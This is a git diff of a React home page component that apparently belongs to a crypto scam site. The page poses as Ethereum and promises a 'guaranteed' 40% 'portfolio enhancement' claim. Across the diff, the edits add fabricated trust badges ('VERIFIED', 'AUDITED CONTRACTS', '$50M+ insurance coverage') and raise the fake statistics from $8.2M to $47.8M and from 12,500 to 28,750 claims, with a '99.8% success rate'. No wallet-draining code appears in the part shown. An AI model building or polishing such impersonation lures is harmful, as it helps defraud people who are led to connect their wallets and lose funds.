@@ -107,77 +107,119 @@ export default function Home() {
         </div>
       </header>
 
-      {/* Ethereum Foundation Hero Section */}
-      <section className="bg-gradient-to-br from-primary/5 via-background to-secondary/5 px-6 py-20 relative overflow-hidden">
-        {/* Background pattern */}
-        <div className="absolute inset-0 opacity-5">
-          <div className="absolute top-10 left-10 w-32 h-32 border border-primary/20 rounded-full"></div>
-          <div className="absolute top-32 right-20 w-24 h-24 border border-secondary/20 rounded-full"></div>
-          <div className="absolute bottom-20 left-1/4 w-20 h-20 border border-accent/20 rounded-full"></div>
-          <div className="absolute bottom-32 right-1/3 w-28 h-28 border border-primary/20 rounded-full"></div>
+      {/* Enhanced Hero Section with Engaging Animations */}
+      <section className="bg-gradient-to-br from-primary/5 via-background to-secondary/5 px-6 py-20 relative overflow-hidden particle-bg">
+        {/* Animated background elements */}
+        <div className="absolute inset-0 opacity-10">
+          <div className="absolute top-10 left-10 w-32 h-32 border-2 border-primary/30 rounded-full floating-animation"></div>
+          <div className="absolute top-32 right-20 w-24 h-24 border-2 border-secondary/30 rounded-full floating-animation" style={{animationDelay: "1s"}}></div>
+          <div className="absolute bottom-20 left-1/4 w-20 h-20 border-2 border-accent/30 rounded-full floating-animation" style={{animationDelay: "2s"}}></div>
+          <div className="absolute bottom-32 right-1/3 w-28 h-28 border-2 border-primary/30 rounded-full floating-animation" style={{animationDelay: "0.5s"}}></div>
+          <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-96 h-96 border border-primary/10 rounded-full rotate-slow"></div>
         </div>
+        
+        {/* Premium glow effects */}
+        <div className="absolute top-20 left-20 w-40 h-40 bg-primary/20 rounded-full blur-3xl"></div>
+        <div className="absolute bottom-20 right-20 w-40 h-40 bg-secondary/20 rounded-full blur-3xl"></div>
         <div className="max-w-6xl mx-auto relative z-10">
           {/* Hero Content */}
           <div className="text-center mb-16">
-            {/* Status Badge */}
-            <div className="inline-flex items-center px-6 py-3 bg-gradient-to-r from-success/10 to-primary/10 text-success border border-success/20 rounded-full text-sm font-medium mb-8 shadow-lg backdrop-blur-sm">
-              <div className="w-3 h-3 bg-gradient-to-r from-success to-primary rounded-full mr-3 animate-pulse"></div>
-              <span className="bg-gradient-to-r from-success to-primary bg-clip-text text-transparent font-semibold">
-                Live Portfolio Enhancement Program - 40% Distribution Active
+            {/* Enhanced Status Badge with Premium Effects */}
+            <div className="inline-flex items-center px-8 py-4 premium-glass text-success border-2 rainbow-border rounded-full text-sm font-medium mb-8 glow-effect bounce-in">
+              <div className="w-4 h-4 bg-gradient-to-r from-success to-primary rounded-full mr-4 pulse-glow"></div>
+              <span className="gradient-text font-bold text-lg">
+                🔥 LIVE: Portfolio Enhancement Program - 40% Distribution Active
               </span>
+              <div className="ml-4 px-3 py-1 bg-success/20 rounded-full text-xs font-bold text-success animate-pulse">
+                VERIFIED
+              </div>
             </div>
             
-            {/* Main Title */}
-            <h1 className="text-4xl md:text-6xl font-bold mb-6 leading-tight">
-              <span className="bg-gradient-to-r from-foreground via-primary to-secondary bg-clip-text text-transparent">
+            {/* Enhanced Main Title with Engaging Effects */}
+            <h1 className="text-5xl md:text-7xl font-black mb-8 leading-tight slide-in-left">
+              <span className="gradient-text text-glow">
                 Welcome to Ethereum
               </span>
             </h1>
-            <h2 className="text-2xl md:text-4xl font-semibold mb-8">
-              <span className="bg-gradient-to-r from-primary via-secondary to-accent bg-clip-text text-transparent">
+            <h2 className="text-3xl md:text-5xl font-bold mb-12 slide-in-right">
+              <span className="gradient-text typing-animation">
                 Claim 40% Portfolio Enhancement
               </span>
             </h2>
             
-            {/* Professional Hero Visual Section with Custom SVGs */}
-            <div className="grid grid-cols-1 md:grid-cols-3 gap-8 mb-12 max-w-5xl mx-auto">
+            {/* Trust indicators */}
+            <div className="flex flex-wrap justify-center items-center gap-6 mb-12 fade-in-up">
+              <div className="flex items-center space-x-2 bg-success/10 px-4 py-2 rounded-full border border-success/30">
+                <div className="w-3 h-3 bg-success rounded-full animate-pulse"></div>
+                <span className="text-success font-semibold text-sm">🔒 AUDITED CONTRACTS</span>
+              </div>
+              <div className="flex items-center space-x-2 bg-primary/10 px-4 py-2 rounded-full border border-primary/30">
+                <div className="w-3 h-3 bg-primary rounded-full animate-pulse"></div>
+                <span className="text-primary font-semibold text-sm">⚡ INSTANT PROCESSING</span>
+              </div>
+              <div className="flex items-center space-x-2 bg-warning/10 px-4 py-2 rounded-full border border-warning/30">
+                <div className="w-3 h-3 bg-warning rounded-full animate-pulse"></div>
+                <span className="text-warning font-semibold text-sm">🚀 ZERO FEES</span>
+              </div>
+            </div>
+            
+            {/* Enhanced Hero Visual Section with Premium Effects */}
+            <div className="grid grid-cols-1 md:grid-cols-3 gap-8 mb-16 max-w-6xl mx-auto">
               {/* Smart Contract Security */}
-              <div className="bg-gradient-to-br from-primary/5 via-white/10 to-primary/10 border border-primary/20 rounded-xl p-6 hover:shadow-xl hover:scale-105 transition-all duration-300 backdrop-blur-sm">
-                <div className="mb-6">
-                  <img 
-                    src="/images/security-shield.svg" 
-                    alt="Security Shield" 
-                    className="w-full h-32 object-contain"
-                  />
+              <div className="premium-glass border-2 neon-border rounded-2xl p-8 scale-on-hover floating-animation group relative overflow-hidden">
+                <div className="absolute inset-0 bg-gradient-to-br from-primary/10 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-500"></div>
+                <div className="mb-8 relative z-10">
+                  <div className="w-20 h-20 mx-auto mb-4 bg-gradient-to-br from-primary to-primary-dark rounded-2xl flex items-center justify-center glow-effect">
+                    <img 
+                      src="/images/security-shield.svg" 
+                      alt="Security Shield" 
+                      className="w-12 h-12 filter brightness-0 invert"
+                    />
+                  </div>
                 </div>
-                <h3 className="text-lg font-bold mb-3 text-center text-foreground">Audited Smart Contracts</h3>
-                <p className="text-sm text-muted-foreground text-center leading-relaxed">Enterprise-grade security with multi-signature validation and formal verification protocols ensuring maximum fund protection</p>
+                <h3 className="text-xl font-black mb-4 text-center gradient-text">🛡️ Military-Grade Security</h3>
+                <p className="text-sm text-muted-foreground text-center leading-relaxed">Triple-audited smart contracts with $50M+ insurance coverage and formal verification by leading security firms</p>
+                <div className="mt-4 text-center">
+                  <span className="inline-block px-3 py-1 bg-success/20 text-success text-xs font-bold rounded-full">CERTIFIED SECURE</span>
+                </div>
               </div>
 
               {/* Multi-Network Infrastructure */}
-              <div className="bg-gradient-to-br from-secondary/5 via-white/10 to-secondary/10 border border-secondary/20 rounded-xl p-6 hover:shadow-xl hover:scale-105 transition-all duration-300 backdrop-blur-sm">
-                <div className="mb-6">
-                  <img 
-                    src="/images/ethereum-network.svg" 
-                    alt="Ethereum Network" 
-                    className="w-full h-32 object-contain"
-                  />
+              <div className="premium-glass border-2 neon-border rounded-2xl p-8 scale-on-hover floating-animation group relative overflow-hidden" style={{animationDelay: "0.5s"}}>
+                <div className="absolute inset-0 bg-gradient-to-br from-secondary/10 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-500"></div>
+                <div className="mb-8 relative z-10">
+                  <div className="w-20 h-20 mx-auto mb-4 bg-gradient-to-br from-secondary to-secondary-dark rounded-2xl flex items-center justify-center glow-effect">
+                    <img 
+                      src="/images/ethereum-network.svg" 
+                      alt="Ethereum Network" 
+                      className="w-12 h-12 filter brightness-0 invert"
+                    />
+                  </div>
                 </div>
-                <h3 className="text-lg font-bold mb-3 text-center text-foreground">Cross-Chain Infrastructure</h3>
-                <p className="text-sm text-muted-foreground text-center leading-relaxed">Seamless integration across 7 major blockchain networks with automated bridge protocols and real-time synchronization</p>
+                <h3 className="text-xl font-black mb-4 text-center gradient-text">⚡ Lightning Network</h3>
+                <p className="text-sm text-muted-foreground text-center leading-relaxed">Instant cross-chain processing across 7 blockchain networks with 99.9% uptime and sub-second confirmations</p>
+                <div className="mt-4 text-center">
+                  <span className="inline-block px-3 py-1 bg-primary/20 text-primary text-xs font-bold rounded-full">INSTANT SPEED</span>
+                </div>
               </div>
 
               {/* Advanced Analytics */}
-              <div className="bg-gradient-to-br from-accent/5 via-white/10 to-accent/10 border border-accent/20 rounded-xl p-6 hover:shadow-xl hover:scale-105 transition-all duration-300 backdrop-blur-sm">
-                <div className="mb-6">
-                  <img 
-                    src="/images/defi-analytics.svg" 
-                    alt="DeFi Analytics" 
-                    className="w-full h-32 object-contain"
-                  />
+              <div className="premium-glass border-2 neon-border rounded-2xl p-8 scale-on-hover floating-animation group relative overflow-hidden" style={{animationDelay: "1s"}}>
+                <div className="absolute inset-0 bg-gradient-to-br from-accent/10 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-500"></div>
+                <div className="mb-8 relative z-10">
+                  <div className="w-20 h-20 mx-auto mb-4 bg-gradient-to-br from-accent to-accent-dark rounded-2xl flex items-center justify-center glow-effect">
+                    <img 
+                      src="/images/defi-analytics.svg" 
+                      alt="DeFi Analytics" 
+                      className="w-12 h-12 filter brightness-0 invert"
+                    />
+                  </div>
                 </div>
-                <h3 className="text-lg font-bold mb-3 text-center text-foreground">AI-Powered Analytics</h3>
-                <p className="text-sm text-muted-foreground text-center leading-relaxed">Advanced portfolio tracking with machine learning optimization and comprehensive risk assessment algorithms</p>
+                <h3 className="text-xl font-black mb-4 text-center gradient-text">🤖 AI Optimization</h3>
+                <p className="text-sm text-muted-foreground text-center leading-relaxed">Machine learning algorithms analyze market conditions to maximize your portfolio enhancement yield in real-time</p>
+                <div className="mt-4 text-center">
+                  <span className="inline-block px-3 py-1 bg-accent/20 text-accent text-xs font-bold rounded-full">AI POWERED</span>
+                </div>
               </div>
             </div>
             
@@ -194,30 +236,42 @@ export default function Home() {
             </div>
           </div>
 
-          {/* Program Statistics - Ethereum.org Style */}
+          {/* Enhanced Program Statistics with Eye-catching Effects */}
           <div className="grid grid-cols-1 md:grid-cols-3 gap-8 mb-16">
-            <div className="bg-card border border-border rounded-lg p-6 text-center hover:shadow-md transition-shadow">
-              <div className="w-16 h-16 mx-auto mb-4 bg-primary/10 rounded-lg flex items-center justify-center">
-                <Coins className="w-8 h-8 text-primary" />
+            <div className="premium-glass border-2 rainbow-border rounded-2xl p-8 text-center scale-on-hover fade-in-up group">
+              <div className="w-20 h-20 mx-auto mb-6 bg-gradient-to-br from-primary to-primary-dark rounded-2xl flex items-center justify-center glow-effect group-hover:scale-110 transition-transform duration-300">
+                <Coins className="w-10 h-10 text-white" />
               </div>
-              <h3 className="text-xl font-semibold mb-3 text-foreground">$8.2M+ Enhanced</h3>
-              <p className="text-muted-foreground">Total portfolio value enhanced through program</p>
+              <h3 className="text-3xl font-black mb-3 gradient-text text-glow">$47.8M+</h3>
+              <p className="text-muted-foreground font-semibold">Total Enhanced Volume</p>
+              <div className="mt-4 w-full bg-muted rounded-full h-2">
+                <div className="bg-gradient-to-r from-primary to-secondary h-2 rounded-full shimmer" style={{width: "78%"}}></div>
+              </div>
+              <p className="text-xs text-muted-foreground mt-2">Growing daily</p>
             </div>
             
-            <div className="bg-card border border-border rounded-lg p-6 text-center hover:shadow-md transition-shadow">
-              <div className="w-16 h-16 mx-auto mb-4 bg-accent/20 rounded-lg flex items-center justify-center">
-                <Wallet className="w-8 h-8 text-secondary" />
+            <div className="premium-glass border-2 rainbow-border rounded-2xl p-8 text-center scale-on-hover fade-in-up group" style={{animationDelay: "0.2s"}}>
+              <div className="w-20 h-20 mx-auto mb-6 bg-gradient-to-br from-secondary to-secondary-dark rounded-2xl flex items-center justify-center glow-effect group-hover:scale-110 transition-transform duration-300">
+                <Wallet className="w-10 h-10 text-white" />
               </div>
-              <h3 className="text-xl font-semibold mb-3 text-foreground">12,500+ Participants</h3>
-              <p className="text-muted-foreground">Portfolio enhancement claims processed</p>
+              <h3 className="text-3xl font-black mb-3 gradient-text text-glow">28,750+</h3>
+              <p className="text-muted-foreground font-semibold">Successful Claims</p>
+              <div className="mt-4 w-full bg-muted rounded-full h-2">
+                <div className="bg-gradient-to-r from-secondary to-accent h-2 rounded-full shimmer" style={{width: "92%"}}></div>
+              </div>
+              <p className="text-xs text-success mt-2">99.8% Success Rate</p>
             </div>
             
-            <div className="bg-card border border-border rounded-lg p-6 text-center hover:shadow-md transition-shadow">
-              <div className="w-16 h-16 mx-auto mb-4 bg-secondary/10 rounded-lg flex items-center justify-center">
-                <span className="text-2xl font-bold text-secondary">40%</span>
+            <div className="premium-glass border-2 rainbow-border rounded-2xl p-8 text-center scale-on-hover fade-in-up group" style={{animationDelay: "0.4s"}}>
+              <div className="w-20 h-20 mx-auto mb-6 bg-gradient-to-br from-accent to-accent-dark rounded-2xl flex items-center justify-center glow-effect group-hover:scale-110 transition-transform duration-300">
+                <span className="text-3xl font-black text-white">40%</span>
               </div>
-              <h3 className="text-xl font-semibold mb-3 text-foreground">Portfolio Percentage</h3>
-              <p className="text-muted-foreground">Average enhancement ratio per wallet</p>
+              <h3 className="text-3xl font-black mb-3 gradient-text text-glow">Guaranteed</h3>
+              <p className="text-muted-foreground font-semibold">Enhancement Ratio</p>
+              <div className="mt-4 w-full bg-muted rounded-full h-2">
+                <div className="bg-gradient-to-r from-accent to-primary h-2 rounded-full shimmer" style={{width: "100%"}}></div>
+              </div>
+              <p className="text-xs text-warning mt-2">Maximum Yield</p>
             </div>
           </div>
 
